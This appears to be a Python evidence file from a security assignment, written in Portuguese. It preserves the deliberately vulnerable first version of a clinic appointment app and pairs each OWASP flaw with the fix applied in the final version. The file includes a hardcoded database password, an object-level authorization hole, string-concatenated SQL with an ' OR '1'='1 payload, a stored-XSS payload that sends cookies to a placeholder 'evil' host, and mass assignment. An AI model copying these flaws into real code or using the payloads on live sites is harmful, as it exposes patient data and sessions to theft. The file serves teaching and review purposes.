"""EVIDÊNCIA Ex.8 - versão INICIAL (vulnerável) que foi analisada. NÃO importar / NÃO usar.
Cada bloco traz a categoria OWASP e a correção aplicada na versão final (app/)."""

DB_PASSWORD = "clinica123"  # A02/A05 Security Misconfiguration -> BaseSettings + .env (app/config.py)


# A01 BOLA: qualquer usuário autenticado lê qualquer consulta trocando o ID na URL
# GET /consultas/2  (token do paciente/profissional B, consulta do A) -> 200 com dados
def obter_consulta_vulneravel(consulta_id: int, user):
    return db.get(Consulta, consulta_id)  # sem checar dono
# CORREÇÃO: app/auth/deps.py::consulta_or_404 (ownership centralizado, 404)


# A03 Injection: SQL por concatenação
# GET /pacientes?q=' OR '1'='1  -> retorna TODOS os pacientes
def buscar_vulneravel(q: str):
    return db.execute(f"SELECT * FROM paciente WHERE nome LIKE '%{q}%'")
# CORREÇÃO: select().where(Paciente.nome.ilike(...)) parametrizado + regex whitelist no Query


# A03 XSS armazenado: motivo salvo sem validação e renderizado com |safe
# POST motivo="<script>fetch('//evil/'+document.cookie)</script>"
#   template: <td>{{ c.motivo|safe }}</td>
# CORREÇÃO: regex whitelist no Pydantic + autoescape do Jinja2 (sem |safe)


# A01/A04 Mass assignment: modelo de entrada aceita campos extras
# PATCH {"motivo":"x","status":"concluida","profissional_id":7} -> sobrescreve campos protegidos
def atualizar_vulneravel(consulta, payload: dict):
    for k, v in payload.items():
        setattr(consulta, k, v)
# CORREÇÃO: Pydantic extra='forbid' (Strict) + campos explícitos em ConsultaUpdate
